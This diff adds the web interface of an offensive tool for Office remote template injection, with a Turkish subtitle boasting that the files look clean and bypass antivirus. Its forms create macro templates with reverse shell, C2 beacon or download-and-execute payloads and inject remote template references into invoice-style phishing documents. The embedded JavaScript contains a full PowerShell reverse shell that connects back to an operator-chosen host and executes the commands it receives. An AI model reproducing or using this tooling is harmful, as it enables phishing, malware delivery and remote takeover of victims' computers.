@@ -1,0 +1,436 @@
+{% extends "base.html" %}
+
+{% block title %}Office Template Injection - Remote Template Attack{% endblock %}
+
+{% block content %}
+<div class="space-y-6">
+    <!-- Header -->
+    <div class="flex items-center justify-between">
+        <div>
+            <h1 class="text-3xl font-bold text-white flex items-center gap-3">
+                <span class="text-4xl">📄</span>
+                Office Template Injection
+                <span class="px-2 py-1 text-xs font-bold bg-gradient-to-r from-red-500 to-orange-500 text-white rounded-full animate-pulse">PRO</span>
+            </h1>
+            <p class="text-gray-400 mt-1">Remote Template Attack - Dosya Temiz Görünür, Antivirüs Atlar</p>
+        </div>
+        <div class="flex gap-3">
+            <button onclick="startServer()" class="px-4 py-2 bg-gradient-to-r from-green-600 to-emerald-600 text-white rounded-lg hover:from-green-700 hover:to-emerald-700 transition-all">
+                🌐 Start Server
+            </button>
+            <button onclick="stopServer()" class="px-4 py-2 bg-gradient-to-r from-red-600 to-pink-600 text-white rounded-lg hover:from-red-700 hover:to-pink-700 transition-all">
+                🛑 Stop Server
+            </button>
+        </div>
+    </div>
+
+    <!-- Stats Cards -->
+    <div class="grid grid-cols-1 md:grid-cols-6 gap-4">
+        <div class="bg-gray-800/50 rounded-xl p-4 border border-red-500/30">
+            <div class="text-3xl font-bold text-red-400">{{ stats.templates }}</div>
+            <div class="text-gray-400 text-sm">Templates</div>
+        </div>
+        <div class="bg-gray-800/50 rounded-xl p-4 border border-blue-500/30">
+            <div class="text-3xl font-bold text-blue-400">{{ stats.injected_documents }}</div>
+            <div class="text-gray-400 text-sm">Injected Docs</div>
+        </div>
+        <div class="bg-gray-800/50 rounded-xl p-4 border border-green-500/30">
+            <div class="text-3xl font-bold text-green-400">{{ stats.campaigns }}</div>
+            <div class="text-gray-400 text-sm">Campaigns</div>
+        </div>
+        <div class="bg-gray-800/50 rounded-xl p-4 border border-yellow-500/30">
+            <div class="text-3xl font-bold text-yellow-400">{{ stats.payload_types }}</div>
+            <div class="text-gray-400 text-sm">Payload Types</div>
+        </div>
+        <div class="bg-gray-800/50 rounded-xl p-4 border border-purple-500/30">
+            <div class="text-3xl font-bold text-purple-400">{{ stats.document_types }}</div>
+            <div class="text-gray-400 text-sm">Doc Types</div>
+        </div>
+        <div class="bg-gray-800/50 rounded-xl p-4 border border-cyan-500/30">
+            <div class="text-3xl font-bold text-cyan-400">{{ stats.pretexts_available }}</div>
+            <div class="text-gray-400 text-sm">Pretexts</div>
+        </div>
+    </div>
+
+    <!-- Main Grid -->
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <!-- Create Malicious Template -->
+        <div class="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
+            <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+                <span>🎭</span> Create Malicious Template
+            </h2>
+            <form id="templateForm" class="space-y-4">
+                <div>
+                    <label class="block text-gray-300 text-sm mb-1">Template Name</label>
+                    <input type="text" id="templateName" placeholder="EvilTemplate" 
+                           class="w-full bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600 focus:border-red-500 focus:outline-none">
+                </div>
+                <div>
+                    <label class="block text-gray-300 text-sm mb-1">Document Type</label>
+                    <select id="templateDocType" class="w-full bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600">
+                        {% for dt in document_types %}
+                        <option value="{{ dt }}">{{ dt | title }}</option>
+                        {% endfor %}
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-gray-300 text-sm mb-1">Payload Type</label>
+                    <select id="templatePayloadType" onchange="updateTemplateParams()" class="w-full bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600">
+                        {% for pt in payload_types %}
+                        <option value="{{ pt }}">{{ pt | title | replace('_', ' ') }}</option>
+                        {% endfor %}
+                    </select>
+                </div>
+                
+                <!-- Payload Parameters -->
+                <div id="templateParams" class="space-y-4">
+                    <div id="shellHostDiv">
+                        <label class="block text-gray-300 text-sm mb-1">Callback Host:Port</label>
+                        <div class="flex gap-2">
+                            <input type="text" id="shellHost" placeholder="192.168.1.100" 
+                                   class="w-2/3 bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600">
+                            <input type="number" id="shellPort" placeholder="4444" 
+                                   class="w-1/3 bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600">
+                        </div>
+                    </div>
+                    <div id="beaconUrlDiv" class="hidden">
+                        <label class="block text-gray-300 text-sm mb-1">C2 URL</label>
+                        <input type="text" id="beaconUrl" placeholder="http://192.168.1.100:8080" 
+                               class="w-full bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600">
+                    </div>
+                    <div id="downloadUrlDiv" class="hidden">
+                        <label class="block text-gray-300 text-sm mb-1">Payload Download URL</label>
+                        <input type="text" id="payloadUrl" placeholder="http://attacker.com/payload.exe" 
+                               class="w-full bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600">
+                    </div>
+                </div>
+                
+                <div>
+                    <label class="block text-gray-300 text-sm mb-1">Custom VBA Macro (optional)</label>
+                    <textarea id="customMacro" rows="4" placeholder="Sub AutoOpen()&#10;    ' Your custom VBA code&#10;End Sub"
+                              class="w-full bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600 font-mono text-sm"></textarea>
+                </div>
+                
+                <button type="submit" class="w-full py-2 bg-gradient-to-r from-red-600 to-orange-600 text-white rounded-lg hover:from-red-700 hover:to-orange-700 font-semibold">
+                    🎭 Create Malicious Template
+                </button>
+            </form>
+        </div>
+
+        <!-- Inject Remote Template -->
+        <div class="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
+            <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+                <span>💉</span> Inject Remote Template
+            </h2>
+            <form id="injectForm" class="space-y-4">
+                <div>
+                    <label class="block text-gray-300 text-sm mb-1">Remote Template URL</label>
+                    <input type="text" id="remoteTemplateUrl" placeholder="http://your-server:8888/evil.dotm" 
+                           class="w-full bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600 focus:border-blue-500 focus:outline-none">
+                </div>
+                <div>
+                    <label class="block text-gray-300 text-sm mb-1">Document Pretext</label>
+                    <select id="pretext" class="w-full bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600">
+                        {% for p in pretexts %}
+                        <option value="{{ p }}">{{ p | title }}</option>
+                        {% endfor %}
+                    </select>
+                </div>
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-gray-300 text-sm mb-1">Invoice # / Name</label>
+                        <input type="text" id="pretextParam1" placeholder="INV-2026-001" 
+                               class="w-full bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600">
+                    </div>
+                    <div>
+                        <label class="block text-gray-300 text-sm mb-1">Year / Quarter</label>
+                        <input type="text" id="pretextParam2" placeholder="2026" 
+                               class="w-full bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600">
+                    </div>
+                </div>
+                
+                <div class="p-4 bg-gray-900 rounded-lg border border-dashed border-gray-600">
+                    <p class="text-gray-400 text-sm text-center">
+                        Or upload existing document:
+                    </p>
+                    <input type="file" id="uploadDoc" accept=".docx,.xlsx,.pptx" 
+                           class="w-full mt-2 text-gray-400">
+                </div>
+                
+                <button type="submit" class="w-full py-2 bg-gradient-to-r from-blue-600 to-cyan-600 text-white rounded-lg hover:from-blue-700 hover:to-cyan-700 font-semibold">
+                    💉 Inject Template & Download
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Templates Table -->
+    <div class="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
+        <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+            <span>📋</span> Malicious Templates
+        </h2>
+        <div class="overflow-x-auto">
+            <table class="w-full text-left">
+                <thead class="text-gray-400 text-sm border-b border-gray-700">
+                    <tr>
+                        <th class="pb-3">Template ID</th>
+                        <th class="pb-3">Name</th>
+                        <th class="pb-3">Doc Type</th>
+                        <th class="pb-3">Payload</th>
+                        <th class="pb-3">Created</th>
+                        <th class="pb-3">Actions</th>
+                    </tr>
+                </thead>
+                <tbody class="text-gray-300">
+                    {% for template in templates %}
+                    <tr class="border-b border-gray-700/50 hover:bg-gray-700/30">
+                        <td class="py-3 font-mono text-xs text-red-400">{{ template.template_id }}</td>
+                        <td class="py-3">{{ template.name }}</td>
+                        <td class="py-3">
+                            <span class="px-2 py-1 bg-blue-500/20 text-blue-400 rounded text-xs">
+                                {{ template.doc_type }}
+                            </span>
+                        </td>
+                        <td class="py-3">
+                            <span class="px-2 py-1 bg-purple-500/20 text-purple-400 rounded text-xs">
+                                {{ template.payload_type }}
+                            </span>
+                        </td>
+                        <td class="py-3 text-sm text-gray-500">{{ template.created_at[:10] }}</td>
+                        <td class="py-3">
+                            <a href="/office-template/api/download-template/{{ template.template_id }}" 
+                               class="text-green-400 hover:text-green-300">
+                                📥 Download
+                            </a>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Injected Documents -->
+    <div class="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
+        <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+            <span>📁</span> Injected Documents
+        </h2>
+        <div class="overflow-x-auto">
+            <table class="w-full text-left">
+                <thead class="text-gray-400 text-sm border-b border-gray-700">
+                    <tr>
+                        <th class="pb-3">Doc ID</th>
+                        <th class="pb-3">Name</th>
+                        <th class="pb-3">Type</th>
+                        <th class="pb-3">Method</th>
+                        <th class="pb-3">Template URL</th>
+                        <th class="pb-3">Created</th>
+                    </tr>
+                </thead>
+                <tbody class="text-gray-300">
+                    {% for doc in documents %}
+                    <tr class="border-b border-gray-700/50 hover:bg-gray-700/30">
+                        <td class="py-3 font-mono text-xs text-blue-400">{{ doc.doc_id }}</td>
+                        <td class="py-3">{{ doc.name }}</td>
+                        <td class="py-3">
+                            <span class="px-2 py-1 bg-green-500/20 text-green-400 rounded text-xs">
+                                {{ doc.doc_type }}
+                            </span>
+                        </td>
+                        <td class="py-3">
+                            <span class="px-2 py-1 bg-yellow-500/20 text-yellow-400 rounded text-xs">
+                                {{ doc.injection_method }}
+                            </span>
+                        </td>
+                        <td class="py-3 font-mono text-xs text-gray-400 max-w-xs truncate">{{ doc.template_url }}</td>
+                        <td class="py-3 text-sm text-gray-500">{{ doc.created_at[:10] }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- How It Works -->
+    <div class="bg-gradient-to-r from-red-900/50 to-orange-900/50 rounded-xl p-6 border border-red-500/30">
+        <h3 class="text-lg font-semibold text-white mb-3 flex items-center gap-2">
+            <span>💡</span> How Template Injection Works
+        </h3>
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-4 text-sm text-gray-300">
+            <div class="text-center">
+                <div class="text-3xl mb-2">📄</div>
+                <h4 class="text-red-400 font-semibold mb-1">1. Clean Document</h4>
+                <p>Create innocent-looking .docx file</p>
+            </div>
+            <div class="text-center">
+                <div class="text-3xl mb-2">💉</div>
+                <h4 class="text-orange-400 font-semibold mb-1">2. Inject Reference</h4>
+                <p>Add remote template URL to settings.xml.rels</p>
+            </div>
+            <div class="text-center">
+                <div class="text-3xl mb-2">📤</div>
+                <h4 class="text-yellow-400 font-semibold mb-1">3. User Opens</h4>
+                <p>Word fetches template from your server</p>
+            </div>
+            <div class="text-center">
+                <div class="text-3xl mb-2">💀</div>
+                <h4 class="text-green-400 font-semibold mb-1">4. Macro Executes</h4>
+                <p>VBA payload runs on victim machine</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+function updateTemplateParams() {
+    const payloadType = document.getElementById('templatePayloadType').value;
+    
+    document.getElementById('shellHostDiv').classList.add('hidden');
+    document.getElementById('beaconUrlDiv').classList.add('hidden');
+    document.getElementById('downloadUrlDiv').classList.add('hidden');
+    
+    if (payloadType === 'reverse_shell') {
+        document.getElementById('shellHostDiv').classList.remove('hidden');
+    } else if (payloadType === 'beacon') {
+        document.getElementById('beaconUrlDiv').classList.remove('hidden');
+    } else if (payloadType === 'download_exec') {
+        document.getElementById('downloadUrlDiv').classList.remove('hidden');
+    }
+}
+
+// Initialize
+updateTemplateParams();
+
+document.getElementById('templateForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const payloadType = document.getElementById('templatePayloadType').value;
+    const data = {
+        name: document.getElementById('templateName').value || 'MaliciousTemplate',
+        doc_type: document.getElementById('templateDocType').value,
+        payload_type: payloadType,
+        custom_payload: document.getElementById('customMacro').value || null
+    };
+    
+    // Add payload-specific params
+    if (payloadType === 'reverse_shell') {
+        data.host = document.getElementById('shellHost').value;
+        data.port = parseInt(document.getElementById('shellPort').value) || 4444;
+        data.payload = `$client = New-Object System.Net.Sockets.TCPClient('${data.host}',${data.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+    } else if (payloadType === 'beacon') {
+        data.c2_url = document.getElementById('beaconUrl').value;
+        data.interval = 60;
+    } else if (payloadType === 'download_exec') {
+        data.payload_url = document.getElementById('payloadUrl').value;
+    }
+    
+    fetch('/office-template/api/create-template', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.success) {
+            alert(`Created template: ${data.template_id}\n\nPayload preview:\n${data.payload_preview}`);
+            location.reload();
+        } else {
+            alert('Error: ' + data.error);
+        }
+    });
+});
+
+document.getElementById('injectForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const templateUrl = document.getElementById('remoteTemplateUrl').value;
+    if (!templateUrl) {
+        alert('Please enter a template URL');
+        return;
+    }
+    
+    const pretext = document.getElementById('pretext').value;
+    const param1 = document.getElementById('pretextParam1').value;
+    const param2 = document.getElementById('pretextParam2').value;
+    
+    // Check for uploaded file
+    const fileInput = document.getElementById('uploadDoc');
+    let docB64 = null;
+    
+    if (fileInput.files.length > 0) {
+        const file = fileInput.files[0];
+        const reader = new FileReader();
+        docB64 = await new Promise((resolve) => {
+            reader.onload = () => resolve(reader.result.split(',')[1]);
+            reader.readAsDataURL(file);
+        });
+    }
+    
+    const data = {
+        template_url: templateUrl,
+        pretext: pretext,
+        pretext_params: {
+            invoice_num: param1,
+            name: param1,
+            quarter: param2,
+            year: param2
+        },
+        document_b64: docB64
+    };
+    
+    fetch('/office-template/api/inject-template', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.success) {
+            // Download the file
+            const blob = new Blob([Uint8Array.from(atob(data.content_b64), c => c.charCodeAt(0))], 
+                                  {type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = data.name;
+            a.click();
+            URL.revokeObjectURL(url);
+            
+            alert(`Injected document created!\nTemplate URL: ${data.template_url}`);
+            location.reload();
+        } else {
+            alert('Error: ' + data.error);
+        }
+    });
+});
+
+function startServer() {
+    const port = prompt('Server port:', '8888');
+    if (!port) return;
+    
+    fetch('/office-template/api/start-server', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({port: parseInt(port)})
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.success) {
+            alert(data.message);
+        } else {
+            alert('Error: ' + data.error);
+        }
+    });
+}
+
+function stopServer() {
+    fetch('/office-template/api/stop-server', {
+        method: 'POST'
+    })
+    .then(r => r.json())
+    .then(data => {
+        alert(data.message || 'Server stopped');
+    });
+}
+</script>
+{% endblock %}
